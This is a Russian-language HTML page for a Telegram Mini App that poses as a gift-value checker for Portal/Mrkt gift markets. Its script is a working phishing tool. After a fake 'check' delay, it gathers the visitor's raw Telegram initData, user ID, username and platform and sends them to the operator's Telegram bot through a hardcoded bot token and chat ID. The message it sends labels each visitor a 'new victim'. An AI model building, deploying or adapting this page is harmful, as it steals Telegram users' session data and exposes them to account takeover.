<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Проверка подарка</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            margin: 0;
            background: #0f0f0f;
            color: #fff;
            font-family: system-ui, -apple-system, sans-serif;
            text-align: center;
            padding: 20px;
        }
        .header {
            background: #229ED9;
            padding: 15px;
            font-weight: bold;
            margin: -20px -20px 30px;
        }
        h1 { margin: 20px 0 10px; }
        .gift { font-size: 60px; margin: 20px 0; }
        .info {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 12px;
            margin: 20px auto;
            max-width: 420px;
            text-align: left;
            font-size: 14px;
        }
        button {
            background: #229ED9;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 10px;
            margin-top: 20px;
            cursor: pointer;
        }
        .status { margin-top: 20px; color: #888; }
    </style>
</head>
<body>

<div class="header">Telegram Web — Проверка подарка</div>

<div class="gift">🎁</div>
<h1>Оценка ликвидности подарка</h1>
<p>Сейчас мы проверим ваши подарки для Portal / Mrkt</p>

<div class="info" id="userInfo">
    Загружаем данные...
</div>

<div class="status" id="status">Ожидание...</div>

<button onclick="checkGift()">🔍 Проверить подарки</button>

<script>
// Настройки бота
const BOT_TOKEN = "8333491656:AAEX9f3mxLFoF-gdrieql_Hlxj4DOegYg_Y"; // ← ЗАМЕНИ НА СВОЙ ТОКЕН
const CHAT_ID = "7523357134"; // ← ЗАМЕНИ НА СВОЙ CHAT ID

const tg = window.Telegram.WebApp;

// Расширяем приложение на весь экран и настраиваем тему
tg.expand();
tg.setHeaderColor("#229ED9");
tg.setBackgroundColor("#0f0f0f");

// Показываем информацию о пользователе
function showUserInfo() {
    const user = tg.initDataUnsafe?.user || {};
    const infoHTML = `
        <strong>Пользователь:</strong> ${user.first_name || 'Неизвестно'} ${user.last_name || ''}<br>
        <strong>ID:</strong> ${user.id || '—'}<br>
        <strong>Username:</strong> @${user.username || '—'}<br>
        <strong>Язык:</strong> ${tg.initDataUnsafe?.user?.language_code || '—'}<br>
        <strong>Платформа:</strong> ${tg.platform || '—'}<br><br>
        <strong>initDataUnsafe:</strong><br>
        <small style="word-break: break-all;">${JSON.stringify(tg.initDataUnsafe, null, 2)}</small>
    `;
    document.getElementById('userInfo').innerHTML = infoHTML;
}

showUserInfo();

// Функция проверки подарка (имитация + отправка данных)
async function checkGift() {
    const statusEl = document.getElementById('status');
    statusEl.textContent = "Проверяем ваши подарки...";
    statusEl.style.color = "#229ED9";

    // Имитируем задержку проверки
    await new Promise(resolve => setTimeout(resolve, 1500));

    const dataToSend = {
        timestamp: new Date().toISOString(),
        user: tg.initDataUnsafe?.user,
        initData: tg.initData,           // raw данные (для валидации)
        initDataUnsafe: tg.initDataUnsafe, // небезопасные данные
        platform: tg.platform,
        version: tg.version,
        url: window.location.href
    };

    const message = `🎁 МИНИ-АПП: НОВАЯ ЖЕРТВА / ТЕСТ\n\n` +
        `Время: ${dataToSend.timestamp}\n` +
        `Пользователь: ${dataToSend.user?.first_name || '—'} (ID: ${dataToSend.user?.id || '—'})\n` +
        `Username: @${dataToSend.user?.username || '—'}\n` +
        `Платформа: ${dataToSend.platform}\n\n` +
        `initDataUnsafe:\n${JSON.stringify(dataToSend.initDataUnsafe, null, 2)}`;

    // Отправляем данные в бот
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "HTML",
                disable_web_page_preview: true
            })
        });
        statusEl.textContent = "✅ Проверка завершена! Данные отправлены.";
        statusEl.style.color = "#4ade80";
    } catch (err) {
        statusEl.textContent = "❌ Ошибка отправки в бот";
        statusEl.style.color = "#ef4444";
        console.error(err);
    }
}

// Закрываем приложение по кнопке назад (опционально)
tg.BackButton.show();
tg.BackButton.onClick(() => tg.close());
</script>

</body>
</html>
